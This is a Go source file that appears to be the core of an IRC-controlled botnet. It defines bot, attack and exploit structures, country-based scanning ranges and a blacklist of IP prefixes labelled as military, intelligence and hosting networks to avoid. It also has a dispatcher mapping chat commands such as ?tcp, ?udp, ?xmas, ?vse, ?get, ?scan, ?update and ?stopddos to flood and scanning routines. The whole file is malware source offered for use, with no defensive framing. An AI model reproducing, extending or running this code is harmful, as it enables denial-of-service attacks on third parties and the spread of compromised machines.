package lib

import (
	"io"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var BotReader, server *string
var ChannelTopic []string //Just for a merge process.

/*
	These 2 variables doesn't merge with the bot structure because of a "fileName" function,
	I want it to be a global function that every structure can access.
*/
var BotGroup, BotID string

type Bot struct {
	CPU                   int
	MipsArch, DefaultArch string
	password, network     string
	Channel, ChanKey      string
	BotTag, BotHerder     string
	ScanOpt, scanOptFull  string
	tempIP                string
	scanNetwork           []string
	isRandom, scanSwitch  bool
	IRC                   net.Conn
	timeout               time.Duration
	session               *ssh.Client
}

type Attack struct {
	srcAddr, dstAddr, url                                string
	dstPort                                              string
	attackBody                                           io.Reader
	flags                                                string
	reportSwitch, attackSwitch                           bool
	ddosPayload                                          []byte
	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
}

type Exploit struct {
	exploitName                                                     string
	exploitBody                                                     io.Reader
	exploitMethod, exploitHeader                                    string
	exploitAgent, exploitAccept, exploitContType, exploitConnection string
}

type Caller struct {
	CallAttack *Attack
	CallBot    *Bot
}

var ScanMap = map[string]Bot{
	"-cn": {
		scanNetwork: ChinaNetwork,
		scanOptFull: "\"CHINA\"",
		isRandom:    false,
	},
	"-hk": {
		scanNetwork: HongKongNetwork,
		scanOptFull: "\"HONG KONG\"",
		isRandom:    false,
	},
	"-kr": {
		scanNetwork: KoreaNetwork,
		scanOptFull: "\"SOUTH KOREA\"",
		isRandom:    false,
	},
	"-br": {
		scanNetwork: BrazilNetwork,
		scanOptFull: "\"BRAZIL\"",
		isRandom:    false,
	},
	"-r": {
		scanNetwork: RandomNetwork,
		scanOptFull: "\"RANDOM\"",
		isRandom:    true,
	},
}

var TCPAttackMap = map[string]Attack{
	"-syn": {
		synFlag: true,
	},
	"-ack": {
		ackFlag: true,
	},
	"-rst": {
		rstFlag: true,
	},
	"-psh": {
		pshFlag: true,
	},
	"-fin": {
		finFlag: true,
	},
	"-urg": {
		urgFlag: true,
	},
}

/*
	Blacklist IP that will be skipped in the random scanning process. Skip since first network ID.
	Some of these first network IDs may be anything not mentionally to be the thing that I have commented on because I skip since the first network ID.
	I don't recommend you to write a map like this in Go, I do this because you know...
	In my opinion, it looks cleaner than using an if statement with an "or" operator for this bunch of Blacklist IPs.
*/
var BlacklistIPs = map[string]struct{}{

	/*
		Loopback
	*/
	"127.": {},

	/*
		General Electric Company
	*/
	"3.": {},

	/*
		Hewlett-Packard Company
	*/
	"15.": {}, "16.": {},

	/*
		US Postal Service
	*/
	"56.": {},

	/*
		Internal network
	*/
	"10.": {}, "192.": {}, "172.": {},

	/*
		NAT
	*/
	"100.": {}, "169.": {},

	/*
		Special use
	*/
	"198.": {},

	/*
		Multicast
	*/
	"224.": {},

	/*
		CIA
	*/
	"162.": {},

	/*
		Cloudflare
	*/
	"104.": {},

	/*
		NASA Kennedy Space Center
	*/
	"163.": {}, "164.": {},

	/*
		Naval Air Systems Command, VA
	*/
	"199.": {},

	/*
		Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
	*/
	"205.": {},

	/*
		FBI controlled Linux servers & IPs/IP-Ranges
	*/
	"207.": {},

	/*
		Amazon + Microsoft
	*/
	"13.": {}, "52.": {}, "54.": {},

	/*
		Ministry of Education Computer Science
	*/
	"120.": {}, "188.": {}, "78.": {},

	/*
		Total Server Solutions
	*/
	"107.": {}, "184.": {}, "206.": {}, "98.": {},

	/*
		Blazingfast & Nforce
	*/
	"63.": {}, "70.": {}, "74.": {},

	/*
		Choopa & Vultr
	*/
	"64.": {}, "185.": {}, "208.": {}, "209.": {}, "45.": {}, "66.": {}, "108.": {}, "216.": {},

	/*
		OVH
	*/
	"149.": {}, "151.": {}, "167.": {}, "176.": {}, "178.": {}, "37.": {}, "46.": {}, "51.": {},
	"5.": {}, "91.": {},

	/*
		Department of Defense
	*/
	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {}, "29.": {},
	"30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
}

func SetupCaller() (Caller, bool) {
	if Find(*BotReader, "?tcp") {
		var CALL_5_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					flags:        Recv(*BotReader, 4),
					srcAddr:      Recv(*BotReader, 5),
					dstAddr:      Recv(*BotReader, 6),
					dstPort:      Recv(*BotReader, 7),
					ddosPayload:  sockBuffer(Recv(*BotReader, 8)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_5_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?xmas") {
		var CALL_4_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_4_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?scan") || Find(*BotReader, "?vse") {
		var CALL_3_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallBot: &Bot{
					ScanOpt:     Recv(*BotReader, 4),
					DefaultArch: Recv(*BotReader, 5),
					MipsArch:    Recv(*BotReader, 6),
					scanSwitch:  false,
				},
			},
			"?vse": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_3_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?update") {
		var CALL_2_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?update": {
				CallBot: &Bot{
					DefaultArch: Recv(*BotReader, 4),
					MipsArch:    Recv(*BotReader, 5),
				},
			},
		}
		value, key := CALL_2_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?poling") || Find(*BotReader, "?jumbo") || Find(*BotReader, "?get") {
		var CALL_1_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					url:          Recv(*BotReader, 4),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_1_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?info") || Find(*BotReader, "?kill") || Find(*BotReader, "?stopddos") || Find(*BotReader, "?stopscan") {
		var CALL_NON_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallBot: &Bot{},
			},
			"?stopddos": {
				CallAttack: &Attack{
					attackSwitch: true,
					reportSwitch: true,
				},
			},
			"?stopscan": {
				CallBot: &Bot{
					scanSwitch: true,
				},
			},
		}
		value, key := CALL_NON_ARG[SetupComd(3, ":")]
		return value, key
	}
	return Caller{}, false
}

func (b *Bot) ExecuteCaller() (func(), bool) {
	var executesCallMap = map[string]func(){
		"?udp":      b.UDP,
		"?tcp":      b.TCP,
		"?saf":      b.SAF,
		"?xmas":     b.XMAS,
		"?vse":      b.VSE,
		"?fms":      b.FMS,
		"?ipsec":    b.IPSEC,
		"?poling":   b.POLING,
		"?jumbo":    b.JUMBO,
		"?get":      b.GET,
		"?scan":     b.Scanner,
		"?update":   b.Update,
		"?info":     b.Information,
		"?kill":     Kill,
		"?stopddos": setAttackSwitch,
		"?stopscan": setScanSwitch,
	}
	value, key := executesCallMap[SetupComd(3, ":")]
	return value, key
}

func FunctionCaller(launch func()) {
	go launch()
}
